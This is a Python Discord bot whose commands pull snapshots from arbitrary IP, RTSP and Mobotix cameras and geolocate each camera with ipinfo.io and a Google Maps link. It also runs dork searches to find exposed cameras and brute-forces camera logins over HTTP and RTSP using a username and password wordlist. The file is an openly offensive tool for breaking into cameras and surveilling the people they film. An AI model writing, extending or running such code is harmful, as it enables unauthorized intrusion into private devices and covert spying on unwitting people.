import discord
from discord import app_commands

import urllib3

import requests
from PIL import Image
from io import BytesIO

import pytz
import socket
from datetime import datetime
from urllib.parse import urlparse

import cv2
import json
import asyncio

from duckduckgo_search import DDGS

YOUR_GUILD_ID = # paste ur guild id

urllib3.disable_warnings()

class aclient(discord.Client):
    def __init__(self):
        super().__init__(intents = discord.Intents.default())
        self.synced = False #we use this so the bot doesn't sync commands more than once

    async def on_ready(self):
        await self.wait_until_ready()
        if not self.synced: #check if slash commands have been synced 
            await tree.sync(guild = discord.Object(id=YOUR_GUILD_ID)) #guild specific: leave blank if global (global registration can take 1-24 hours)
            self.synced = True
        print(f"We have logged in as {self.user}.")

client = aclient()
tree = app_commands.CommandTree(client)

async def extract_ip(base_url: str):
    try:
        # Try to parse the base_url as a URL
        parsed_url = urlparse(base_url)
        if parsed_url.hostname:
            return await resolve_hostname(parsed_url.hostname)
        
        # If it's not a valid URL, try to resolve it as an IP address
        socket.inet_aton(base_url)
        return base_url
    except (OSError, socket.error):
        # If it's neither a valid URL nor a valid IP address, try to resolve it as a hostname
        return await resolve_hostname(base_url)

# saw this so I just copypasted
async def resolve_hostname(hostname: str):
    try:
        results = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC)
        ipv4_addresses = []
        # ipv6_addresses = []

        for result in results:
            family, _, _, _, sockaddr = result
            address = sockaddr[0]

            if family == socket.AF_INET:
                ipv4_addresses.append(address)
            # elif family == socket.AF_INET6:
            #     ipv6_addresses.append(address)

        # Prefer IPv4 over IPv6 if available
        if ipv4_addresses:
            return ipv4_addresses[0]
        #elif ipv6_addresses:
        #    return ipv6_addresses[0]
        else:
            raise ValueError(f"No valid IP addresses found for '{hostname}'")

    except (socket.gaierror, ValueError) as e:
        raise ValueError(f"Error resolving '{hostname}': {e}")

@tree.command(name='url', description='Snapshot of any IP camera', guild=discord.Object(id=YOUR_GUILD_ID))
@app_commands.describe(base_url='The base URL of the camera or IP address (e.g. http://75.151.66.58)',
                       image_path='The path to the image on the camera (e.g. /jpg/image.jpg)',
                       token='Token from ipinfo.com. If you don\'t have a token, type [no]')
async def snapshot(interaction: discord.Interaction, base_url: str, image_path: str, token: str):
    try:
        await interaction.response.defer()

        camera_url = f"{base_url}{image_path}"
        ip_addr = await extract_ip(base_url)
        print(ip_addr)

        response = requests.get(camera_url, verify=False)
        response.raise_for_status()

        if 'image' in response.headers['Content-Type']:
            image = Image.open(BytesIO(response.content))

            embed = discord.Embed(title="Camera Snapshot", color=discord.Color.blurple())

            now = datetime.now()
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S %Z")

            if token == 'no':
                embed.set_footer(text=f"UTC Time: {timestamp}")
            else:
                ipinfo_url = f"https://ipinfo.io/{ip_addr}?token={token}"
                ipinfo_response = requests.get(ipinfo_url)
                ipinfo_response.raise_for_status()
                ipinfo_data = ipinfo_response.json()

                latitude, longitude = ipinfo_data.get('loc', '0,0').split(',')
                country = ipinfo_data.get('country', 'N/A')
                region = ipinfo_data.get('region', 'N/A')
                city = ipinfo_data.get('city', 'N/A')
                timezone = ipinfo_data.get('timezone', 'UTC')
                google_maps_url = f"https://www.google.com/maps/{latitude},{longitude},1000m/data=!3m1!1e3?entry=ttu"

                tz = pytz.timezone(timezone)
                local_now = datetime.now(tz)
                local_timestamp = local_now.strftime("%Y-%m-%d %H:%M:%S %Z")

                additional_text = (f"Local Time: {local_timestamp}\n"
                                   f"Latitude: {latitude}, Longitude: {longitude}\n"
                                   f"Country: {country}\nRegion: {region}\nCity: {city}\n"
                                   f"Google Map: {google_maps_url}")

                embed.set_footer(text=f"UTC Time: {timestamp}\n{additional_text}")

            embed.set_image(url="attachment://camera_snapshot.jpg")

            image_path = "camera_snapshot.jpg"
            image.save(image_path)
            with open(image_path, 'rb') as f:
                picture = discord.File(f)
                await interaction.followup.send(file=picture, embed=embed)

            print("Snapshot sent to Discord")
        else:
            await interaction.followup.send("The URL did not return an image.")
    except Exception as e:
        try:
            await interaction.followup.send(f"An error occurred: {e}")
        except Exception as e:
            print(f"Failed to send error message: {e}")

@tree.command(name='rtsp', description='Snapshot of RTSP camera', guild=discord.Object(id=YOUR_GUILD_ID))
@app_commands.describe(rtsp_url='The RTSP URL of the camera (e.g. rtsp://example.com/stream)',
                       token='Token from ipinfo.com. If you don\'t have token, type [no]',
                       username='No neeeded, should be left empty and in url format',
                       password='No neeeded, should be left empty and in url format')
# @app_commands.checks.cooldown(1, 3, key=lambda i: (i.guild_id, i.user.id))
async def rtsp(interaction: discord.Interaction, rtsp_url: str, username: str = None, password: str = None, token: str = 'no'):
    try:
        await interaction.response.defer()
        ip_addr = await extract_ip(rtsp_url)
        print(f"Resolved IP: {ip_addr}")

        if username and password:
            parsed_url = urlparse(rtsp_url)
            rtsp_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.hostname}{parsed_url.path}?{parsed_url.query}"
        

        cap = cv2.VideoCapture(rtsp_url)
        if not cap.isOpened():
            raise ValueError("Failed to open RTSP stream")

        ret, frame = cap.read()
        cap.release()

        if not ret:
            raise ValueError("Failed to capture frame from RTSP stream")

        image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))

        embed = discord.Embed(title="RTSP Camera Snapshot", color=discord.Color.blurple())
        now = datetime.now()
        timestamp = now.strftime("%Y-%m-%d %H:%M:%S %Z")

        if token == 'no':
            embed.set_footer(text=f"UTC Time: {timestamp}")
        else:
            ipinfo_url = f"https://ipinfo.io/{ip_addr}?token={token}"
            ipinfo_response = requests.get(ipinfo_url)
            ipinfo_response.raise_for_status()
            ipinfo_data = ipinfo_response.json()

            latitude, longitude = ipinfo_data.get('loc', '0,0').split(',')
            country = ipinfo_data.get('country', 'N/A')
            region = ipinfo_data.get('region', 'N/A')
            city = ipinfo_data.get('city', 'N/A')
            timezone = ipinfo_data.get('timezone', 'UTC')            
            # google_maps_url = f"https://www.google.com/maps/{latitude},{longitude},1000m/data=!3m1!1e3?entry=ttu"

            tz = pytz.timezone(timezone)
            local_now = datetime.now(tz)
            local_timestamp = local_now.strftime("%Y-%m-%d %H:%M:%S %Z")

            additional_text = (f"Local Time: {local_timestamp}\n"
                               f"Latitude: {latitude}, Longitude: {longitude}\n"
                               f"Country: {country}\nRegion: {region}\nCity: {city}")

            embed.set_footer(text=f"UTC Time: {timestamp}\n{additional_text}")

        embed.set_image(url="attachment://rtsp_camera_snapshot.jpg")

        image_path = "rtsp_camera_snapshot.jpg"
        image.save(image_path)
        with open(image_path, 'rb') as f:
            picture = discord.File(f)
            await interaction.followup.send(file=picture, embed=embed)

        print("RTSP snapshot sent to Discord")
    except Exception as e:
        interaction.response.send_message(f"An error occurred: {e}")
        try:
            await interaction.followup.send(f"An error occurred: {e}")
        except Exception as e:
            interaction.response.send_message(f"Failed to send error message: {e}")

@tree.command(name='mobotix', description='Snapshot of Mobotix camera', guild=discord.Object(id=YOUR_GUILD_ID))
@app_commands.describe(ip='The IP address of the Mobotix camera', port='The port number of the Mobotix camera')
async def mobotix(interaction: discord.Interaction, ip: str, port: str, token: str = 'no'):
    try:
        await interaction.response.defer()
        
        camera_url = f"https://{ip}:{port}/record/current.jpg"

        try:
            response = requests.get(camera_url, verify=False)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"Failed to access HTTPS URL: {e}")
            camera_url = f"http://{ip}:{port}/record/current.jpg"

        print(f"Resolved URL: {camera_url}")

        response = requests.get(camera_url, verify=False)
        response.raise_for_status()

        if 'image' in response.headers['Content-Type']:
            image = Image.open(BytesIO(response.content))

            embed = discord.Embed(title="Mobotix Camera Snapshot", color=discord.Color.blurple())
            now = datetime.now()
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S %Z")

            if token == 'no':
                embed.set_footer(text=f"UTC Time: {timestamp}")
            else:
                ipinfo_url = f"https://ipinfo.io/{ip}?token={token}"
                ipinfo_response = requests.get(ipinfo_url)
                ipinfo_response.raise_for_status()
                ipinfo_data = ipinfo_response.json()

                latitude, longitude = ipinfo_data.get('loc', '0,0').split(',')
                country = ipinfo_data.get('country', 'N/A')
                region = ipinfo_data.get('region', 'N/A')
                city = ipinfo_data.get('city', 'N/A')
                timezone = ipinfo_data.get('timezone', 'UTC')

                tz = pytz.timezone(timezone)
                local_now = datetime.now(tz)
                local_timestamp = local_now.strftime("%Y-%m-%d %H:%M:%S %Z")

                additional_text = (f"Local Time: {local_timestamp}\n"
                                   f"Latitude: {latitude}, Longitude: {longitude}\n"
                                   f"Country: {country}\nRegion: {region}\nCity: {city}")

                embed.set_footer(text=f"UTC Time: {timestamp}\n{additional_text}")

            embed.set_image(url="attachment://mobotix_snapshot.jpg")

            image_path = "mobotix_snapshot.jpg"
            image.save(image_path)
            with open(image_path, 'rb') as f:
                picture = discord.File(f)
                await interaction.followup.send(file=picture, embed=embed)

            print("Mobotix snapshot sent to Discord")
        else:
            await interaction.followup.send("The camera did not return an image.")
    except Exception as e:
        try:
            await interaction.followup.send(f"An error occurred: {e}")
        except Exception as e:
            print(f"Failed to send error message: {e}")

@tree.command(name='search', description='Search for Dorks', guild=discord.Object(id=YOUR_GUILD_ID))
@app_commands.describe(search='self-explanatory', amount='Enter amount of search results')
async def search_dorks(interaction: discord.Interaction, search: str, amount: int):
    await interaction.response.defer()

    try:
        results = DDGS().text(search, max_results=amount)

        if not results:
            await interaction.followup.send("No results found.")
            return

        embed = discord.Embed(title=f"Search Results for '{search}'", color=discord.Color.blue())

        for i, result in enumerate(results, start=1):
            embed.add_field(name=f"{i}. {result['href']}", value=result.get('text', 'No description'), inline=False)

        if len(embed.fields) > 25:
            # Split if it exceeds Discord's field limit
            chunks = [embed.fields[i:i+25] for i in range(0, len(embed.fields), 25)]
            for i, chunk in enumerate(chunks, start=1):
                new_embed = discord.Embed(title=f"Search Results for '{search}' (Part {i}/{len(chunks)})", color=discord.Color.blue())
                for field in chunk:
                    new_embed.add_field(**field)
                await interaction.followup.send(embed=new_embed)
        else:
            await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {e}")

@tree.command(name='bruteforce-http', description='Attempt to brute force login to IP camera', guild=discord.Object(id=YOUR_GUILD_ID))
@app_commands.describe(base_url='The base URL of the camera')
async def bruteforce(interaction: discord.Interaction, base_url: str):
    try:
        await interaction.response.defer()
        ip_addr = await extract_ip(base_url)
        print(f"Resolved IP: {ip_addr}")

        credentials_file = "./credentials.json"

        with open(credentials_file, 'r') as f:
            creds = json.load(f)

        usernames = creds.get('usernames', [])
        passwords = creds.get('passwords', [])

        successful_login = None

        for username in usernames:
            for password in passwords:
                try:
                    # Construct the URL with username and password for basic auth
                    url_with_auth = f"{base_url.replace('http://', f'http://{username}:{password}@')}"
                    response = requests.get(url_with_auth, verify=False, timeout=5)
                    if response.status_code == 200:
                        successful_login = (username, password)
                        break
                except requests.exceptions.RequestException as e:
                    print(f"Request failed with exception: {e}")

            if successful_login:
                break

        if successful_login:
            username, password = successful_login
            response_text = f"Successful login with username: {username} and password: {password}"
        else:
            response_text = "Failed to login with any provided credentials."

        await interaction.followup.send(response_text)
        print(response_text)

    except Exception as e:
        try:
            await interaction.followup.send(f"An error occurred: {e}")
        except Exception as e:
            print(f"Failed to send error message: {e}")

@tree.command(name='bruteforce-rtsp', description='Attempt to brute force login to RTSP camera', guild=discord.Object(id=YOUR_GUILD_ID))
@app_commands.describe(rtsp_url='The RTSP URL of the camera')
async def bruteforce_rtsp(interaction: discord.Interaction, rtsp_url: str):
    try:
        await interaction.response.defer()

        credentials_file = "./credentials.json"

        with open(credentials_file, 'r') as f:
            creds = json.load(f)

        usernames = creds.get('usernames', [])
        passwords = creds.get('passwords', [])

        successful_login = None

        async def try_login(username, password):
            nonlocal successful_login
            test_url = rtsp_url.replace("://", f"://{username}:{password}@", 1)
            cap = cv2.VideoCapture(test_url)
            if cap.isOpened():
                successful_login = (username, password)
                cap.release()

        tasks = []
        for username in usernames:
            for password in passwords:
                task = asyncio.create_task(try_login(username, password))
                tasks.append(task)

        await asyncio.gather(*tasks)

        if successful_login:
            username, password = successful_login
            response_text = f"Successful login with username: {username} and password: {password}"
        else:
            response_text = "Failed to login with any provided credentials."

        await interaction.response.send_message(response_text)

    except Exception as e:
        await interaction.response.send_message(f"An error occurred: {e}")


DISCORD_TOKEN = input("Please enter your Discord Token: ")

client.run(DISCORD_TOKEN)
